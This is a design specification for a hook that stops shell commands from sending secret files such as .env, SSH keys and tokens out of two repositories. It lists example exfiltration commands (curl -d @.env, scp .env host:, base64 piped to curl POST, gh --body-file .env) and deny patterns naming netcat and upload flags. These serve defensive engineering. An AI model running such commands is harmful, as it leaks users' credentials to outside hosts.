# Exfiltration guard (2026-09-13)

A new `.claude/hooks/check_exfiltration.py`, registered alongside
`check_env_access.py`, in **both** `~/pr-review-bot` and
`~/onboarding-wizard`. It modifies neither that file nor `redact_output.py`
in either repo.

## The asymmetry this closes

`check_env_access.py` has two mechanisms and both face **inbound**: part 1
denies a tool call whose path names `.env`; part 2 rewrites every shell command
so its output is scrubbed before reaching Claude. Both protect the transcript.

Nothing protects the other direction. `curl -d @.env https://...`,
`scp .env host:`, `base64 .env | curl -X POST ...`, `gh issue create
--body-file .env` all send the real bytes **outward** and return nothing
interesting; the redaction filter dutifully scrubs a response that never
contained the secret. CLAUDE.md's "never write a secret value into anything
that leaves this local session or gets persisted somewhere shared" is the one
rule in the Secret-handling section with no mechanical backstop at all.

## Scope: two repositories

`~/onboarding-wizard` is a mirror of this project's secret-handling setup, not
a loose relative. Verified 2026-09-13: identical `.claude/hooks/` pair,
identical `.claude/settings.json` registration (`uv run --no-project python
${CLAUDE_PROJECT_DIR}/.claude/hooks/check_env_access.py`), a `.env` at mode 400
with `chattr +i`, the same four hook test files, the same `docs/superpowers/
specs/` convention, its own `ISSUES.md`, and the same verbatim "Never modify
`check_env_access.py` or `redact_output.py`" rule in its own `CLAUDE.md`. The
outbound gap is therefore identical in both, and so is the fix.

### The two copies have already drifted -- this is the problem to design around

`redact_output.py` is **byte-identical** across the repos. `check_env_access.py`
is **not**: `~/onboarding-wizard` never received the 2026-09-12 worktree fix and
still carries the pipe-based wrapper, which means every Bash call inside an
`EnterWorktree` session there is refused exactly as described in this project's
`ISSUES.md` 2026-09-11 entry.

Nobody decided that. It happened because the two copies are maintained by hand
with no mechanism -- not even an advisory one -- that notices when one moves and
the other does not. Adding a second hook file to both repos *doubles that
surface* unless the sync problem is addressed in the same change, so this design
treats sync as a first-class requirement rather than an afterthought.

**Neither repo's CI can enforce it.** Neither checks the other out, and making
one block on the other would invert the deadlock-free direction this project's
cross-repo contract section deliberately establishes ("its lag is reported by a
scheduled advisory job, never by a blocking check"). What is achievable, and
what this design requires:

- **The shared logic is byte-identical across both repos**, so drift is
  detectable by a single `diff` with no interpretation needed.
- **Everything repo-specific lives in exactly one clearly-marked block** -- the
  `_PROTECTED` list -- so the byte-identical claim survives real per-repo
  differences.
- **A documented sync step in both `CLAUDE.md` files**: changing a hook in one
  repo means porting it to the other in the same session, verified with
  `diff`, before either change is considered done.

### Out of scope: porting the worktree fix to the wizard

Correcting the drift in `check_env_access.py` itself -- bringing the wizard's
copy up to the file-fed shape -- is **not** part of this work. That file is
protected in both repos by a rule requiring the user's direct instruction, and
"the spec said so" is not that instruction. It is recorded as a known drift in
both `ISSUES.md` files so it is not silently inherited, and it is a one-session
change whenever the user chooses to authorise it.

This has one visible consequence for the design below: the wizard's wrapper
still **pipes**, so it writes no sink file, so the wizard's `_PROTECTED` list
has no sink entry. That is a correct per-repo difference today and becomes an
incorrect one the moment the worktree fix is ported -- called out in the list
itself so whoever ports it knows to add the row.

## Why text inspection is sufficient here, having failed for reads

`2026-09-06-env-hook-hardening-design.md` rejected command inspection for the
read side, and was right to: the ways a command can *read* a file are unbounded
(`grep -r`, `find -exec`, `xargs`, a variable-held path, a symlink, a tar), and
`coo-quack/sensitive-canary` -- a far more thorough implementation of exactly
that approach -- documents its own bypasses (`f=.env; cat "$f"`,
`find . -name '.env' | xargs cat`) in its README.

Egress has a different shape, and the difference is what makes inspection
viable:

- **The verb set is small and enumerable.** A program that reaches the network
  is a short list, and it must appear literally in the command text.
- **A false positive costs a prompt, not a broken session.** On the read side a
  false negative was silent and a false positive blocked work. Here the default
  failure mode is an `ask`.
- **It is defense in depth, not the primary control.** The primary control
  remains that `.env` is mode 400 + `chattr +i` and is never opened.

So this guard does not have to be complete to earn its place. It has to catch
the careless case, which is the case that actually happens.

## Non-goals

- **Not a malicious-agent defense.** Anything deliberately trying to
  exfiltrate can rename, split, encode, or stage through an intermediate file.
  This is an accident guard, exactly as the wrapper is.
- **Not inbound.** The redaction wrapper keeps that job, unchanged.
- **Not Artifact / Agent / Task prompts.** CLAUDE.md names those vectors too.
  Covering them was considered and declined on 2026-09-13 (decision recorded so
  the gap is *named*, not assumed covered): the shell is where the mechanical
  patterns are tractable, and a second reader of `.env` in the Agent path would
  add a secret-touching code path to close a vector prose already covers.
- **Not a modification to `check_env_access.py` or `redact_output.py`.**

## Mechanism

A `PreToolUse` hook matching `Bash|PowerShell`, registered in
`.claude/settings.json` as a second handler beside the existing one.

Three harness behaviours are load-bearing, and each is why the shape is what it
is:

- **Matching hooks run in parallel and all receive the same original input.**
  This guard therefore inspects the command *as written*, not
  `check_env_access.py`'s rewritten form. That is what we want -- the rewritten
  form contains a literal sink path and a `uv run` invocation that would muddy
  every pattern here. It is also an assumption to pin with a test: were the
  harness ever to make hooks sequential with `updatedInput` propagation, this
  hook would start seeing wrapped text and its patterns would silently stop
  matching the parts that matter.
- **Deny is expressed as exit code 2, not as JSON.** `check_env_access.py`
  returns `permissionDecision: "allow"` for *every* Bash command. Precedence
  between a sibling hook's `allow` and this hook's JSON `deny` is undocumented.
  Exit 2 is documented to stop the call "even [overriding] a JSON
  permissionDecision of allow", and to do so before permission rules are
  evaluated. The reason text goes to stderr.
- **Ask is expressed as JSON `permissionDecision: "ask"`,** because exit 2 has
  no "ask" equivalent. Its precedence against the sibling `allow` is the one
  thing that cannot be settled from documentation -- see Open risks.

## Protected paths

One explicit list, one entry per location, deliberately
**layout-indifferent** -- and **identical in both repos**, which is what lets
the whole file be byte-identical and therefore drift-checkable by a plain
`diff`:

| Path | Kind | Why |
|---|---|---|
| `.env` | REPO | Resolves against whichever repo the hook is running in, so one literal entry covers both. The credential file the whole mechanism exists for. |
| `~/.cache/pr-review-bot-redact/` | HOME | The review engine's redaction sink: a command's **unredacted** combined output at 0600, from the moment the command finishes until the filter reads it, plus anything the 1-hour sweep has not yet collected. Exfiltrating one of these is exactly as bad as exfiltrating `.env`, and nothing guards it today. It exists *only because the wrapper exists*. |
| `~/.cache/onboarding-wizard-redact/` | HOME | **Reserved, does not exist yet.** The wizard's wrapper still pipes and writes no sink. Listing it now costs nothing -- a path that never exists never matches -- and buys two things: this list stays identical across both repos, and porting the worktree fix to the wizard needs no edit here. Whoever ports it should confirm the sink directory it creates is named this. |
| `~/.config/impeccable-hf/token` | HOME | The Hugging Face token this project's CLAUDE.md documents as machine-local tooling. Outside both repos, on this box, equally real if leaked. |
| `~/.ssh/`, `~/.config/gh/` | HOME | Authenticate this machine as a person. |
| `*.pem`, `*service-account*.json` | GLOB | Ad hoc key material written mid-task to an unpredictable location. A pattern rule by necessity: the whole point is that the file is somewhere no list anticipated. |

Listing both repos' sinks in both copies is deliberate rather than sloppy.
Cross-repo protection is a feature here: a command run from a wizard session
that reads the review engine's sink should be refused just as firmly as one
run from the review engine's own session.

Consolidating `<repo>/.env` and `~/.config/impeccable-hf/token` -- the two rows
whose location this project actually chooses -- into one machine-local
directory (`~/.secrets/pr-review-bot/`) was discussed on 2026-09-13 and
deliberately left out of scope. It is a good idea: outside the repo means
outside every recursive search rooted here, outside the Docker build context,
outside any `tar`/`cp -r` of the tree, and one `chmod`/`chattr` covers
everything at once. But it is the migration half of the superseded "retire the
wrapper" design -- `config.py:54`'s `env_file` is CWD-relative, and
`check_env_access.py`'s `_PATTERN` would have to become a prefix match, which
is an edit to a protected file. Keeping the list explicit and flat here means
that change costs one entry rather than a rewrite.

The remaining rows cannot be consolidated even in principle, which is worth
recording so nobody re-opens the question expecting a cleaner sweep:
`~/.ssh/` and `~/.config/gh/` are owned by ssh and the `gh` CLI and must stay
where those tools look for them; the two `~/.cache/*-redact/` entries are the
wrappers' own scratch directories rather than stored credentials, and belong
with the caches they are; and the last row is a filename pattern with no fixed
location at all -- catching a file that landed somewhere unanticipated is the
entire point of it.

### Editing the list

The list is the one part of this hook a future reader is *expected* to change,
so it ships as a single self-documenting block rather than as constants
scattered through the module. Adding or removing a guarded location must never
require reading the matching logic. The shape:

```python
# ===========================================================================
# PROTECTED PATHS -- edit this block to guard a new location, or stop
# guarding one. This is the only part of this file you should need to touch.
#
# Each entry is ("KIND", "path"). Three kinds are understood:
#
#   "REPO"  path relative to the repository root
#   "HOME"  path relative to the current user's home directory
#   "GLOB"  a filename pattern, matched wherever the file happens to live
#
# A trailing "/" marks a directory: everything beneath it is guarded too.
#
#   To ADD a location ...... append one line to the right group below
#   To STOP guarding one ... delete its line; nothing else references it
#   After either .......... uv run pytest tests/test_exfiltration_hook.py
#
# Examples (copy one, edit it, drop the leading "#"):
#
#   ("REPO", ".env")                        one file in the repo
#   ("REPO", "secrets/")                    a whole directory in the repo
#   ("HOME", ".config/impeccable-hf/token") one file under ~
#   ("HOME", ".ssh/")                       a whole directory under ~
#   ("GLOB", "*.pem")                       any .pem, anywhere
#   ("GLOB", "*service-account*.json")      any file matching, anywhere
#
# NOTE: listing a path here does NOT change who can read it. This list only
# controls what this guard refuses to send OUTWARD. File permissions are a
# separate mechanism -- see CLAUDE.md's "Secret handling" section.
# ===========================================================================
_PROTECTED: tuple[tuple[str, str], ...] = (
    # --- this repo's own credentials ("REPO" resolves per repo, so this one
    #     line is correct in pr-review-bot AND onboarding-wizard) ---
    ("REPO", ".env"),

    # --- redaction-wrapper sinks: unredacted command output at rest.
    #     BOTH repos' sinks are listed in BOTH copies on purpose. A path that
    #     does not exist simply never matches, and keeping the entry here is
    #     what lets this file stay byte-identical across the two repos (see
    #     "Scope: two repositories"). The wizard's does not exist yet -- its
    #     wrapper still pipes. ---
    ("HOME", ".cache/pr-review-bot-redact/"),
    ("HOME", ".cache/onboarding-wizard-redact/"),

    # --- machine-local credentials owned by other tooling ---
    ("HOME", ".config/impeccable-hf/token"),
    ("HOME", ".ssh/"),
    ("HOME", ".config/gh/"),

    # --- key material that can land anywhere ---
    ("GLOB", "*.pem"),
    ("GLOB", "*service-account*.json"),
)
```

Two properties of this block are requirements, not styling. **A new entry must
need no other edit** -- kind plus path is the whole interface, and the matcher
reads the tuple rather than hard-coding any path. And **the comment must say
what the list does not do**, because "protected" reads like "made unreadable",
which this list has no power to do; a reader who adds a path here and assumes
the file is now locked down has been actively misled.

## Classification: deny versus ask

**Deny (exit 2)** -- a protected path sits in a recognised *payload position*
of a network command. There is no benign reading of these:

- `curl` with `-d @<path>`, `--data@<path>`, `-F ...=@<path>`, `-T`/
  `--upload-file <path>`
- `wget --post-file=<path>`
- `scp <path> <host>:`, `rsync <path> <host>:`
- `nc`/`netcat` with `< <path>`
- `ssh <host> ... < <path>`
- `gh ... --body-file <path>`
- a pipeline that reads a protected path (`cat`/`base64`/`tar`) and contains a
  network verb downstream
- `git add -f <path>` or any command staging a protected path -- `.env` is
  gitignored precisely so this cannot happen accidentally, so forcing past it
  is never accidental

**Ask (JSON)** -- both a protected path and an egress verb appear, but not in a
shape that proves intent:

- a network verb and a protected path in the same command, outside a known
  payload position
- a protected path anywhere in a command that pipes into a program the hook has
  no model for
- `tar`/`zip` whose inputs include a protected path
- `docker build` whose context directory contains a protected path (the
  `.dockerignore` lines are a second net, not the first)

**Silent pass** -- everything else, including prose that merely mentions `.env`
(a commit message, a doc edit), `.env.example`/`.env.config`, and
`--body-file` pointed at an ordinary file. The existing hook's `_PATTERN`
already demonstrates the component-matching discipline these must not regress.

## What this does not close

Stated plainly so no one mistakes the guard for a boundary:

- Any encode/rename/stage-through-a-temp-file sequence across two tool calls.
- The `Artifact`, `Agent`/`Task` vectors named under Non-goals.
- A harness-surfaced "file changed externally" diff, which is not a tool call
  at all and which CLAUDE.md already flags as having no mechanical backstop.
- Egress from a process the shell starts indirectly (a test that POSTs, a
  script that reads a protected path itself).

## Testing

`tests/test_exfiltration_hook.py` in **each** repo, mirroring that repo's own
`tests/test_check_env_access_hook.py` shape. The file is byte-identical across
the two, like the hook it tests:

- one case per deny pattern, asserting exit code 2 specifically (not merely
  "blocked") -- the exit code *is* the mechanism
- one case per ask pattern, asserting the JSON shape
- false-positive cases: prose mentioning `.env`, `.env.example`/`.env.config`,
  `gh issue create --body-file notes.md`, a `curl` with no protected path
- a case asserting the hook receives the **original** command text, pinning the
  parallel-execution assumption above
- a case asserting a sink directory is covered, since those are the entries
  most likely to be dropped by someone who reads the list as "the `.env` guard"
- a case asserting `_PROTECTED` contains both `~/.cache/*-redact/` entries,
  so the cross-repo-identical property cannot be quietly broken by deleting the
  one that looks irrelevant in whichever repo the reader is standing in

### Drift check

Each repo's suite can only see its own copy, so neither can assert the two are
identical. The check is therefore a documented human/agent step, not a test:

```
diff ~/pr-review-bot/.claude/hooks/check_exfiltration.py \
     ~/onboarding-wizard/.claude/hooks/check_exfiltration.py
diff ~/pr-review-bot/tests/test_exfiltration_hook.py \
     ~/onboarding-wizard/tests/test_exfiltration_hook.py
```

Both must print nothing. This runs at the end of the implementation and again
whenever either copy is touched. It is cheap precisely because the design
refuses to let any per-repo difference into the file.

## Rollout

Order matters: the second repo is a verbatim copy of the first, never a
re-implementation.

1. Build the hook and its tests in `~/pr-review-bot`. Full suite plus `ruff`
   green there.
2. Copy both files verbatim into `~/onboarding-wizard`. Run that repo's full
   suite plus `ruff` there too -- the wizard's test conventions and fixtures
   are its own, so a byte-identical test file still has to be proven green
   against its suite rather than assumed.
3. Register the hook in **both** `.claude/settings.json` files, as a second
   entry alongside the existing `check_env_access.py` handler. Hooks load at
   session start, so neither takes effect until the next session.
4. Run the drift check above. Both `diff`s silent.
5. Verify the ask path live, once, in one repo, with a harmless command that
   should prompt. If `ask` loses to the sibling `allow`, apply the fallback in
   Open risk 1 -- in both repos.
6. Record the outcome here and in both `ISSUES.md` files.

## Open risks

1. **`ask` precedence against the sibling hook's `allow` is unverified.** If a
   sibling `allow` suppresses it, every ask-class pattern silently becomes a
   pass. **Fallback:** promote the ask set to deny (exit 2, which is known to
   win) and accept the false positives, or drop the ask class entirely and
   document those shapes as prose-only. This must be checked before the guard
   is described anywhere as covering the ask cases -- and the result applies to
   both repos, since the sibling hook is the same in both.
2. **Parallel-hook input semantics are documented loosely.** Pinned by a test;
   if it ever fails, the patterns need rewriting against wrapped text.
3. **`.dockerignore` and `.gitignore` remain first-line protections** for their
   own vectors. This guard is additive and must not become the reason either is
   relaxed.
4. **Drift will recur unless the sync step is honoured.** `check_env_access.py`
   already drifted once, silently, and nothing caught it for months. The only
   defences this design can offer are that the files are byte-identical (so
   `diff` is conclusive), that the sync step is written into both `CLAUDE.md`
   files, and that the existing drift is logged in both `ISSUES.md` files. None
   of those is mechanical. A future change that makes the two copies
   legitimately differ should be resisted hard -- the per-repo escape hatch is
   `_PROTECTED`, and it was designed wide enough that nothing else should need
   one.
